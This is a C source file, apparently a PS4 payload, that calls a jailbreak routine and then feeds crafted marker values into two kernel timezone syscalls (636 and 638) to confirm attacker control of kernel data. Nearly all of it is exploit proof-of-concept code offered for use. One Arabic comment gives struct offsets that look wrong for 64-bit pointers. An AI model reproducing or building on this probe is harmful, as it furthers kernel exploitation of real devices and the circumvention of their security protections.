#include "ps4.h"

#define SYS_SET_TIMEZONE_INFO 636
#define SYS_UTC_TO_LOCALTIME  638

int _main(struct thread *td) {
    UNUSED(td);

    initKernel();
    initLibc();
    initNetwork();
    jailbreak();
    initSysUtil();

    printf_debug("=== timezone PoC ===\n");

    static uint8_t data[512 * 16];
    memset(data, 0, sizeof(data));

    *(long*)(data + 0)  = 0x0;
    *(int*)(data  + 8)  = 0x41414141;
    *(int*)(data  + 12) = 0x42424242;

    *(long*)(data + 16) = 0x7FFFFFFF;
    *(int*)(data  + 24) = 0x43434343;
    *(int*)(data  + 28) = 0x44444444;

    // struct مع padding صريح
    struct {
        void*    ptr;    // offset 0
        uint32_t pad;    // offset 4 ← padding!
        uint32_t count;  // offset 8
    } set_args = {
        .ptr   = data,
        .pad   = 0,
        .count = 2
    };

    printf_debug("ptr   = %p\n",      set_args.ptr);
    printf_debug("count = %d\n",      set_args.count);
    printf_debug("struct size = %d\n", (int)sizeof(set_args));

    int r = syscall(SYS_SET_TIMEZONE_INFO, &set_args);
    printf_debug("set_timezone r=%d\n", r);

    if (r != 0) {
        printf_debug("[-] failed\n");
        return 0;
    }

    long result  = 0;
    int  dst_out = 0;

    struct {
        long  timestamp;
        long* out_time;
        void* out_info;
        int*  out_dst;
    } utc_args = {
        .timestamp = 0x1000,
        .out_time  = &result,
        .out_info  = NULL,
        .out_dst   = &dst_out,
    };

    r = syscall(SYS_UTC_TO_LOCALTIME, &utc_args);
    printf_debug("utc r=%d\n",     r);
    printf_debug("result=0x%lx\n", result);

    long expected = 0x1000 + 0x41414141LL;
    if (result == expected) {
        printf_debug("[+] DATA CONTROL CONFIRMED!\n");
    } else {
        printf_debug("expected=0x%lx\n", expected);
    }

    return 0;
}